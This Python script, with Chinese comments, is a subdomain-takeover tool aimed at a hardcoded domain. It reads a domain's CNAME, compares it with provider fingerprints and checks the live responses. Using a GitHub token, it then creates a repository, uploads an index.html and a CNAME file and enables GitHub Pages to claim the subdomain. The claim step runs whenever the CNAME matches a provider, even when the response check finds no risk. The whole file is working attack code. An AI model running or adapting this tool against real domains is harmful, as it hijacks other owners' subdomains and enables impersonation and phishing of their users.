# encoding: utf-8

import requests
import dns.resolver
import sys,getopt,os,base64,json
import yaml
import config

HEADERS = {
    "Accept":"application/json, text/javascript, */*; q=0.01",
    "Accept-Language":"zh-CN,zh;q=0.9",
    "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
}

# github自动接管
def github_takeover(url):
    # 读取config配置文件
    repo_name = url
    print('[*]正在读取配置文件...')
    user = config.github_api_user
    token = config.github_api_token
    CHECK_HEADERS = {
    "Authorization": 'token '+ token,
    "Accept": "application/vnd.github.switcheroo-preview+json"
    }
    repos_url = 'https://api.github.com/repos/'+ user +'/' + repo_name
    repos_r = requests.get(url=repos_url,headers=CHECK_HEADERS)
    # 验证token是否正确
    if 'message' in repos_r.json():
        if repos_r.json()['message'] == 'Bad credentials':
            print('[*]请检查Token是否正确')
        elif repos_r.json()['message'] == 'Not Found':
            print('[*]正在生成接管库...') # 生成接管库
            creat_repo_dict = {
                  "name": repo_name,
                  "description": "This is a subdomain takeover Repository",
                }
            creat_repo_url = 'https://api.github.com/user/repos'
            creat_repo_r = requests.post(url=creat_repo_url,headers=CHECK_HEADERS,data=json.dumps(creat_repo_dict))
            creat_repo_status = creat_repo_r.status_code
            if creat_repo_status == 201:
                print('[*]创建接管库' + repo_name + '成功，正在进行自动接管...' )
                # 接管文件生成
                # index.html文件
                html = b'''
                <html>
                    <p>Subdomain Takerover Test!</>
                </html>
                '''
                html64 = base64.b64encode(html).decode('utf-8')
                html_dict = {
                   "message": "my commit message",
                   "committer": {
                     "name": "user", #提交id，非必改项
                     "email": "user@163.com" #同上
                   },
                   "content": html64
                }
                # CNAME文件
                cname_url = bytes(url,encoding='utf-8')
                cname_url64 = base64.b64encode(cname_url).decode('utf-8')
                url_dict = {
                       "message": "my commit message",
                       "committer": {
                         "name": "user",
                         "email": "user@163.com"
                       },
                       "content": cname_url64
                    }
                html_url = 'https://api.github.com/repos/' + user + '/' + repo_name + '/contents/index.html'
                url_url = 'https://api.github.com/repos/' + user + '/' + repo_name + '/contents/CNAME'
                html_r = requests.put(url=html_url,data=json.dumps(html_dict), headers=CHECK_HEADERS) #上传index.html
                cname_r = requests.put(url=url_url,data=json.dumps(url_dict), headers=CHECK_HEADERS) # 上传CNAME
                rs=cname_r.status_code
                if rs==201:
                    print('[*]生成接管库成功，正在开启Github pages...')
                    page_url = "https://api.github.com/repos/"+ user +"/"+url+"/pages"
                    page_dict={
                        "source": {
                            "branch": "master"
                      }
                    }
                    page_r = requests.post(url=page_url,data=json.dumps(page_dict), headers=CHECK_HEADERS) # 开启page
                    if page_r.status_code == 201:
                        print('[+]自动接管成功，请稍后访问http://'+str(url)+'查看结果')
                    else:
                        print('[+]开启Github pages失败，请检查网络或稍后重试...')
                else:
                    print('[+]生成接管库失败，请检查网络或稍后重试...')
    elif url in repos_r.json()['name']:
        print('[*]生成接管库失败，请检查https://github.com/'+user+
                        '?tab=repositories是否存在同名接管库...')

# 发起请求
def url_get(url):
    r = requests.get(url,HEADERS,timeout=5)
    status_code = r.status_code
    response_text = r.content.decode('utf-8')
    return status_code,response_text

# 指纹读取 存储到json_dicts中
def providers_read():
    try:
        with open('./data/providers.json','r') as f:
            str_json = f.read()
            json_dicts = json.loads(str_json)
            return json_dicts
    except:
        print('[*] Wrong! 请检查是否存在providers.json文件')

# 获取cname记录
def cname_get(url):
    print('[*]正在获取'+ url + '的CNAME记录')
    try:
        cn = dns.resolver.query(url,'CNAME')
        for rrset in cn.response.answer:
            for cname in rrset.items:
                return (cname.to_text())
    except: #不存在cname解析，pass
        print('[*]' + url + '未找到CNAME记录')


# 检查是否存在子域接管漏洞
def takeover_check(url,cname,fingercname_lists):
    check_cname = 'http://' + cname
    check_url = 'http://' + url
    cnameresponse_text = url_get(check_cname)[1] # 解析cname返回文本
    url_response_text = url_get(check_url)[1] # 解析url返回文本
    # 与指纹对比查看cname对比判断是否存在接管风险，与url对比判断是否已被接管
    for fingerprint in fingercname_lists:
        if fingerprint in cnameresponse_text:
            print('[*]'+ url + '存在子域接管风险')
            print('[*]正在检测当前是否已经被接管...')
            if fingerprint in url_response_text:
                print('[+]当前未被接管，url：' + url + ',CNMAE：' + cname)
            else:
                print('[*]当前可能已被接管，url：' + url + ',CNMAE：' + cname)
        else:
            pass

# 自动接管模块
def auto_take(url):
    github_takeover(url) # Github自动接管

# 主函数
def main(url):
    cname = cname_get(url)
    if cname != None:
        print('[*]CNAME获取成功，正在验证是否存在于敏感列表中...')
        json_dicts = providers_read() # 接收指纹信息
        for json_dict in json_dicts:
            fingerprint_lists = json_dict['response'] # 存储指纹信息
            fingercname_lists = json_dict['cname'] # 存储cname信息
            for fingercname in fingercname_lists:
                # 查看cname解析值是否在指纹列表中
                if fingercname in cname:
                    print('[*]存在于指纹列表中，正在检测子域接管风险...')
                    takeover_check(url,cname,fingerprint_lists) # 检查是否有风险以及是否已经被接管
                    auto_take(url) # 自动接管
                else:
                    pass
    else:
        print('[*]' + url + '不存在被接管风险')            

if __name__ == '__main__':
    url = 'test.djmag.club' #传入目标
    main(url)
